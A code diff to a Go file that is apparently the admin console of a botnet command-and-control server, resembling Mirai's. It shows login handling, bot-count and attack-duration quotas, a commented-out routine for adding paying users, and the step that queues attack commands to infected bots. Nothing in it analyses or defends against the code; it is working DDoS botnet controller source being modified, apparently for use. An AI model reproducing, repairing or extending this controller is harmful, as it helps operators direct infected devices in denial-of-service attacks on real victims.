@@ -13,6 +13,7 @@ type Admin struct {
     conn    net.Conn
 }
 
+
 func NewAdmin(conn net.Conn) *Admin {
     return &Admin{conn}
 }
@@ -63,7 +64,7 @@ func (this *Admin) Handle() {
 
     var loggedIn bool
     var userInfo AccountInfo
-    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
+    if loggedIn, userInfo = TryLogin(username, password); !loggedIn {
         this.conn.Write([]byte("\r\033[32;1mAn unknown error occured\r\n"))
         this.conn.Write([]byte("\033[31mPress any key to exit.\033[0m\r\n"))
         buf := make([]byte, 1)
@@ -122,62 +123,62 @@ func (this *Admin) Handle() {
         }
         botCount = userInfo.maxBots
 
-        if userInfo.admin == 1 && cmd == "adduser" {
-            this.conn.Write([]byte("Enter new username: "))
-            new_un, err := this.ReadLine(false)
-            if err != nil {
-                return
-            }
-            this.conn.Write([]byte("Enter new password: "))
-            new_pw, err := this.ReadLine(false)
-            if err != nil {
-                return
-            }
-            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
-            max_bots_str, err := this.ReadLine(false)
-            if err != nil {
-                return
-            }
-            max_bots, err := strconv.Atoi(max_bots_str)
-            if err != nil {
-                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
-                continue
-            }
-            this.conn.Write([]byte("Max attack duration (-1 for none): "))
-            duration_str, err := this.ReadLine(false)
-            if err != nil {
-                return
-            }
-            duration, err := strconv.Atoi(duration_str)
-            if err != nil {
-                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
-                continue
-            }
-            this.conn.Write([]byte("Cooldown time (0 for none): "))
-            cooldown_str, err := this.ReadLine(false)
-            if err != nil {
-                return
-            }
-            cooldown, err := strconv.Atoi(cooldown_str)
-            if err != nil {
-                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
-                continue
-            }
-            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
-            confirm, err := this.ReadLine(false)
-            if err != nil {
-                return
-            }
-            if confirm != "y" {
-                continue
-            }
-            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
-                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
-            } else {
-                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
-            }
-            continue
-        }
+        // if userInfo.admin == 1 && cmd == "adduser" {
+        //     this.conn.Write([]byte("Enter new username: "))
+        //     new_un, err := this.ReadLine(false)
+        //     if err != nil {
+        //         return
+        //     }
+        //     this.conn.Write([]byte("Enter new password: "))
+        //     new_pw, err := this.ReadLine(false)
+        //     if err != nil {
+        //         return
+        //     }
+        //     this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
+        //     max_bots_str, err := this.ReadLine(false)
+        //     if err != nil {
+        //         return
+        //     }
+        //     max_bots, err := strconv.Atoi(max_bots_str)
+        //     if err != nil {
+        //         this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
+        //         continue
+        //     }
+        //     this.conn.Write([]byte("Max attack duration (-1 for none): "))
+        //     duration_str, err := this.ReadLine(false)
+        //     if err != nil {
+        //         return
+        //     }
+        //     duration, err := strconv.Atoi(duration_str)
+        //     if err != nil {
+        //         this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
+        //         continue
+        //     }
+        //     this.conn.Write([]byte("Cooldown time (0 for none): "))
+        //     cooldown_str, err := this.ReadLine(false)
+        //     if err != nil {
+        //         return
+        //     }
+        //     cooldown, err := strconv.Atoi(cooldown_str)
+        //     if err != nil {
+        //         this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
+        //         continue
+        //     }
+        //     this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
+        //     confirm, err := this.ReadLine(false)
+        //     if err != nil {
+        //         return
+        //     }
+        //     if confirm != "y" {
+        //         continue
+        //     }
+        //     if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
+        //         this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
+        //     } else {
+        //         this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
+        //     }
+        //     continue
+        // }
         if userInfo.admin == 1 && cmd == "botcount" {
             m := clientList.Distribution()
             for k, v := range m {
@@ -213,9 +214,9 @@ func (this *Admin) Handle() {
             if err != nil {
                 this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
             } else {
-                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
+                if can, err := CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                     this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
-                } else if !database.ContainsWhitelistedTargets(atk) {
+                } else if !ContainsWhitelistedTargets(atk) {
                     clientList.QueueBuf(buf, botCount, botCatagory)
                 } else {
                     fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
